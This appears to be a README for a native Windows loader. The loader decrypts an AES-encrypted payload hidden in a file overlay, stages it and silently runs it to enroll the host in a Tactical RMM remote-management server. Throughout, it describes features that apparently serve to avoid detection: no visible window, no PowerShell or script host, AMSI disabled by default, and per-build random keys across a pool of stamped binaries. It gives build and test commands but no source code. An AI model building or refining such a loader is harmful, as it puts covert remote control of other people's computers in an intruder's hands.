# Native launcher (Option 3) — automatic enrollment, no Mono runtime

Replaces the Mono-IL `Launcher.exe` with a **bare native Windows PE** so the
ZIP bundle actually enrolls a device end-to-end on a stock Windows host:

- **runs on stock Windows** — no Mono/.NET runtime, no file-association hack
  (fixes the earlier "device not added" runtime gap).
- **auto-enrolls** — the launcher does not stop at staging: it stages the
  decrypted agent to `<outDir>\_stg_<TAG>.exe`, waits ~6s for it to settle, then
  runs the **staged payload itself** with the full `enroll` argv
  (`-m install --api … --client-id … --site-id … --agent-type … --auth …`)
  via `CreateProcess` — zero manual steps. No `/VERYSILENT` run and no reliance
  on a fixed `C:\Program Files\TacticalAgent\tacticalrmm.exe` path (the staged
  payload is a raw agent transport binary, not an Inno installer).
- **no console, no PowerShell, no script host, no shell invocation** — compiled
  with `-mwindows` (PE Subsystem 2 / GUI); `enroll` is parsed (never run
  through a shell) and handed to `CreateProcess`. AMSI default stays `none`.

The `VNTR` overlay wire format is **unchanged** (LOCKED in
`docs/launcher-integration-spec.md`); this is a byte-compatible re-implementation of
the decryption in C, so pooled server stamps keep working.

## Files

| file | purpose |
|---|---|
| `launcher.c`   | entry point: self-locate → decrypt → stage → settle-wait → run staged payload with the `enroll` argv (or `SELFTEST`) |
| `overlay.c`    | LOCKED VNTR overlay reader + AES-256-CTR envelope/config/payload decrypt |
| `aes256.c/.h`  | AES-256 (encrypt block) + CTR with big-endian 128-bit counter (byte-identical to template.cs/OpenSSL) |
| `config.c`     | percent-decoded config parser; quote-aware tokenizer for the `enroll` line |
| `spawn.c`      | `CreateProcess` (Windows, no window) / fork-exec (POSIX) |
| `seal.h`       | compile-time seal — `KEY`/`IV`/`TAG` baked per build (mirror of `SealData.cs`) |
| `build-native.sh` | MinGW cross-compile to a GUI-subsystem PE + asserts Subsystem=2 + SHA-256 |

## Build (cross-compile a Windows PE)

```bash
# on a host with x86_64-w64-mingw32-gcc (e.g. Ubuntu: apt-get install gcc-mingw-w64-x86-64)
cd generator/launcher/native
KEY=$(od -An -N32 -tx1 /dev/urandom | tr -d ' \n')
IV=$(od  -An -N16 -tx1 /dev/urandom | tr -d ' \n')
TAG=$(od -An -N16 -tx1 /dev/urandom | tr -d ' \n')
bash build-native.sh /tmp/Launcher.exe "$KEY" "$IV" "$TAG"
# -> PE32+ (GUI) + sha256 (verify: file /tmp/Launcher.exe shows "GUI")
```

The generator's launcher pool does this automatically when
`LAUNCHER_NATIVE=1` (see `generator/src/env.ts` → `env.LAUNCHER_NATIVE` and
`launcher-pool.ts → buildOne()`). `NATIVE_CC` overrides the compiler name.

## Host selftest (validate crypto + parser without Windows)

```bash
cc -O2 -DSELFTEST -o /tmp/lztest launcher.c overlay.c config.c spawn.c aes256.c
# stamp a dev overlay with make-stamp.mjs using the SAME seal as seal.h, then:
/tmp/lztest <stamped.exe> <outPayload.bin>     # -> SELFTEST-OK + CONFIG + ENROLL-TOKENS
cmp <outPayload.bin> <sourcePayload.bin>       # -> byte-identical (crypto proof)
```

## Verified 2026-09-13

- `cc` (macOS) compiles both `SELFTEST` and production branches clean.
- Host round-trip: C decrypted a `make-stamp.mjs` overlay to a **byte-identical**
  payload (`C-PAYLOAD-MATCH`, SHA-256 equal) — envelope/config/payload AES-256-CTR
  matches template.cs + Node.
- `enroll` PS-style line parsed to the correct `[exe] + argv`
  (`C:\Program Files\TacticalAgent\tacticalrmm.exe -m install …`) for `CreateProcess`.
- VPS cross-compile (`x86_64-w64-mingw32-gcc`): `file → PE32+ executable (GUI)`,
  byte-level Subsystem=2, `CreateProcessA`/`-m install`/marker strings present.
- `generator/src/launcher-pool.ts peSubsystem()` fixed to read Subsystem at +68 for
  both PE32 and PE32+ (the old +72 for 0x20b read `DllCharacteristics` and would
  have discarded a 64-bit native launcher).

## Known remaining step (unavoidable off this host)

A Windows-VM / wine run to observe the live silent-install → enroll → device
Online. No wine is present on the build VPS; the runbook step (3-E) covers it.